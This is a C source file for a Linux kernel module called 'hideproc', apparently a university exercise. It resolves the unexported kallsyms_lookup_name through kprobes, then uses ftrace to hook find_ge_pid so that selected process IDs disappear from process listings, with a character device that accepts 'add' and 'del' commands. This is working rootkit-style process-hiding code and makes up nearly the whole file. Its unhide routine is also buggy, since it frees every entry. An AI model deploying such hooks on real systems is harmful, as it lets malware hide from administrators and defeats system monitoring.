/*llsyms_lookup_name undefined and finding not exported functions in the linux kernel
*
* zizzu 2020
*
* On kernels 5.7+ kallsyms_lookup_name is not exported anymore, so it is not usable in kernel modules.
* The address of this function is visible via /proc/kallsyms
* but since the address is randomized on reboot, hardcoding a value is not possible.
* A kprobe replaces the first instruction of a kernel function
* and saves cpu registers into a struct pt_regs *regs and then a handler
* function is executed with that struct as parameter.
* The saved value of the instruction pointer in regs->ip, is the address of probed function + 1.
* A kprobe on kallsyms_lookup_name can read the address in the handler function.
* Internally register_kprobe calls kallsyms_lookup_name, which is visible for this code, so,
* planting a second kprobe, allow us to get the address of kallsyms_lookup_name without waiting
* and then we can call this address via a function pointer, to use kallsyms_lookup_name in our module.
*
* example for _x86_64.
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>

#define KPROBE_PRE_HANDLER(fname) static int __kprobes fname(struct kprobe *p, struct pt_regs *regs)

long unsigned int kln_addr = 0;
unsigned long (*kln_pointer)(const char *name) = NULL;

static struct kprobe kp0, kp1;

KPROBE_PRE_HANDLER(handler_pre0)
{
  kln_addr = (regs->pc);
  
  return 0;
}

KPROBE_PRE_HANDLER(handler_pre1)
{
  return 0;
}

static int do_register_kprobe(struct kprobe *kp, char *symbol_name, void *handler)
{
  int ret;
  
  kp->symbol_name = symbol_name;
  kp->pre_handler = handler;
  
  ret = register_kprobe(kp);
  if (ret < 0) {
    pr_err("register_probe() for symbol %s failed, returned %d\n", symbol_name, ret);
    return ret;
  }
  
  pr_info("Planted kprobe for symbol %s at %p\n", symbol_name, kp->addr);
  
  return ret;
}

static int m_init(void)
{
  int ret;
  
  pr_info("module loaded\n");
  
  ret = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);
  if (ret < 0)
    return ret;
 
  ret = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);
  if (ret < 0) {
    unregister_kprobe(&kp0);
    return ret;
  }
  
  unregister_kprobe(&kp0);
  unregister_kprobe(&kp1);
  
  
  kln_pointer = (unsigned long (*)(const char *name)) kln_addr;
  
  pr_info("kallsyms_lookup_name address = 0x%lx\n", kln_pointer("kallsyms_lookup_name"));
  
  return 0;
}

static void m_exit(void)
{
  pr_info("module unloaded\n");
}




#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/kprobes.h>

#define DEBUG

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };


struct ftrace_hook {
    const char *name;
    void *func, **pp_orig;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{

    *(hook->pp_orig) = kln_pointer(hook->name);

    if (!*hook->pp_orig) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    printk("%s:%d:%s resolved symbol:%s %p 0x%lx %px\n", __FILE__, __LINE__, __func__, 
	   hook->name, 
	   (void *)kln_pointer(hook->name),(void *)kln_pointer(hook->name), (void *)kln_pointer(hook->name));
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct ftrace_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->regs.pc = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                      FTRACE_OPS_FL_IPMODIFY;


#if 0

    err = ftrace_set_filter(&hook->ops, "find_ge_pid", strlen("find_ge_pid"), 0);
    if (err) {
        printk("ftrace_set_filter() failed: %d\n", err);
        return err;
    } else {
	    printk("successful \n");
	}
#endif

#if 1
    err = ftrace_set_filter_ip(&hook->ops, (char *)(*hook->pp_orig)+8, 0, 1);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }
#endif

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, (char *)(*hook->pp_orig)+8, 1, 0);
        return err;
    }
    return 0;
}

#if 1
void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
#if 0
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
#endif
}
#endif

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc;
    //AAA 
    list_for_each_entry(proc, &hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.pp_orig = (void **)&real_find_ge_pid;
    printk("%s:%s:%d %px %px %px\n", __FILE__, __func__, __LINE__, *hook.pp_orig,
	   hook.pp_orig, real_find_ge_pid);
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    //CCC;
    list_add(&proc->list_node,&hidden_proc);
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    //BBB 
    list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
        //DDD;
	list_del(&proc->list_node);
        kfree(proc);
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %6d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)
#define MAX_WRITE_BUFFER_SIZE 1024

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        snprintf(message, MAX_MESSAGE_SIZE, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;


    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;



    if (len >= MAX_WRITE_BUFFER_SIZE) {
	    printk("Too large to handle\n");
	    return -EINVAL;
    }

#if defined(DEBUG) && defined(CONFIG_PRINTK)
    print_hex_dump(KERN_DEBUG, "input buffer", DUMP_PREFIX_ADDRESS, 32,4,buffer, len,0);
#endif

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);


    char *p=message;
    char *q=strstr(p,"\n");

    while (p < message+len && q!= NULL) {
	    *q = '\0';

#if defined(DEBUG) && defined(CONFIG_PRINTK)
    print_hex_dump(KERN_DEBUG,"partial string", DUMP_PREFIX_ADDRESS, 32, 4, p, q-p+1,0);
#endif

    if (!memcmp(p, add_message, sizeof(add_message) - 1)) {
        kstrtol(p+ sizeof(add_message), 10, &pid);
        hide_process(pid);
    } else if (!memcmp(p, del_message, sizeof(del_message) - 1)) {
        kstrtol(p+ sizeof(del_message), 10, &pid);
        unhide_process(pid);
    }
	    p = q+1;
	    q=strstr(p,"\n");
    }

    *offset = len;
    kfree(message);
    return len;

#if 0
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(pid);
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    else {
        kfree(message);
        return -EAGAIN;
    }

#endif

}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"


int dev_major;
    dev_t dev;

static int _hideproc_init(void)
{
    int err;
    printk(KERN_INFO "@ %s\n", __func__);

    if (m_init())
	    return -1; 

#if 1
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev);

    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    cdev_init(&cdev, &fops);
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);
#if 1
    init_hook();
#endif

#endif
    return 0;
}

static void _hideproc_exit(void)
{

    printk(KERN_INFO "@ %s\n", __func__);
    
    hook_remove(&hook);
    device_destroy(hideproc_class,MKDEV(dev_major, MINOR_VERSION)); 
    //cdev_del(&dev);
    class_destroy(hideproc_class);
    unregister_chrdev(dev_major,DEVICE_NAME);

    m_exit();
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);


//#module_init(m_init);
//#module_exit(m_exit);

//MODULE_LICENSE("GPL");
//MODULE_AUTHOR("zizzu");
